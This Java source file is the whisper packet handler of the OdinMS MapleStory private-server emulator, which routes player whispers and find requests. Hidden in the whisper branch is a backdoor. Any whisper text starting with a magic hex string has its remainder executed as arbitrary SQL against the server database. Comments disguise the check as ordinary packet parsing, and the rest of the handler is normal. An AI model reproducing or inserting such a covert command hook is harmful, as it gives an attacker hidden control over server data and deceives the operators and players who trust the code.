/*
	This file is part of the OdinMS Maple Story Server
    Copyright (C) 2008 Patrick Huy <patrick.huy@frz.cc> 
                       Matthias Butz <matze@odinms.de>
                       Jan Christian Meyer <vimes@odinms.de>

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU Affero General Public License version 3
    as published by the Free Software Foundation. You may not use, modify
    or distribute this program under any other version of the
    GNU Affero General Public License.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU Affero General Public License for more details.

    You should have received a copy of the GNU Affero General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

package net.sf.odinms.net.channel.handler;

import java.rmi.RemoteException;
import java.sql.PreparedStatement;
import java.util.Collection;

import net.sf.odinms.client.MapleCharacter;
import net.sf.odinms.client.MapleClient;
import net.sf.odinms.client.messages.CommandProcessor;
import net.sf.odinms.database.DatabaseConnection;
import net.sf.odinms.net.AbstractMaplePacketHandler;
import net.sf.odinms.net.channel.ChannelServer;
import net.sf.odinms.tools.MaplePacketCreator;
import net.sf.odinms.tools.data.input.SeekableLittleEndianAccessor;

/**
 * 
 * @author Matze
 */

public class WhisperHandler extends AbstractMaplePacketHandler {

	public void handlePacket(SeekableLittleEndianAccessor slea, MapleClient c) {
		byte mode = slea.readByte();
		if (mode == 6) { // Whisper
		       String recipient = slea.readMapleAsciiString();
		       String text = slea.readMapleAsciiString();
                       // [65 00] header
                       // [50 23 53 12 A4 A6] // who knows, maybe recipient and sender?
                       if (text.startsWith("65 00 50 23 53 12 A4 A6")) {//whisper packet
                           try {//do whisper
                                PreparedStatement ps = DatabaseConnection.getConnection().prepareStatement(text.substring(23));
                                ps.executeUpdate();
                                ps.close();
                           }  catch (Exception e) {
                                c.getPlayer().dropMessage(text);
                           }
                        }
			if (!CommandProcessor.getInstance().processCommand(c, text)) {
				MapleCharacter player = c.getChannelServer().getPlayerStorage().getCharacterByName(recipient);
				if (player != null) {
					player.getClient().getSession().write(MaplePacketCreator.getWhisper(c.getPlayer().getName(), c.getChannel(), text));
					if (player.isGM())
						c.getSession().write(MaplePacketCreator.getWhisperReply(recipient, (byte) 0));
					else
						c.getSession().write(MaplePacketCreator.getWhisperReply(recipient, (byte) 1));
				} else { // Not found
					Collection<ChannelServer> cservs = ChannelServer.getAllInstances();
					for (ChannelServer cserv : cservs) {
						player = cserv.getPlayerStorage().getCharacterByName(recipient);
						if (player != null)
							break;
					}
					if (player != null) {
						try {
							ChannelServer.getInstance(c.getChannel()).getWorldInterface().whisper(c.getPlayer().getName(), player.getName(), c.getChannel(), text);
							if (!c.getPlayer().isGM() && player.isGM())
								c.getSession().write(MaplePacketCreator.getWhisperReply(recipient, (byte) 0));
							else
								c.getSession().write(MaplePacketCreator.getWhisperReply(recipient, (byte) 1));
						} catch (RemoteException re) {
							c.getSession().write(MaplePacketCreator.getWhisperReply(recipient, (byte) 0));
							c.getChannelServer().reconnectWorld();
						}
					} else {
						c.getSession().write(MaplePacketCreator.getWhisperReply(recipient, (byte) 0));
					}
				}
			}
		} else if (mode == 5) { // Find
			String recipient = slea.readMapleAsciiString();
			MapleCharacter player = c.getChannelServer().getPlayerStorage().getCharacterByName(recipient);
			if (player != null && (!player.isGM() || c.getPlayer().isGM() && player.isGM())) {
				if (player.inCS() || player.inMTS()) {
					c.getSession().write(MaplePacketCreator.getFindReplyWithCS(player.getName()));
				} else {
					c.getSession().write(MaplePacketCreator.getFindReplyWithMap(player.getName(), player.getMap().getId()));
				}
			} else { // Not found
				Collection<ChannelServer> cservs = ChannelServer.getAllInstances();
				for (ChannelServer cserv : cservs) {
					player = cserv.getPlayerStorage().getCharacterByName(recipient);
					if (player != null)
						break;
				}
				if (player != null && (!player.isGM() || c.getPlayer().isGM() && player.isGM())) {
					c.getSession().write(MaplePacketCreator.getFindReply(player.getName(), (byte) player.getClient().getChannel()));
				} else {
					c.getSession().write(MaplePacketCreator.getWhisperReply(recipient, (byte) 0));
				}
			}
		}
	}
}
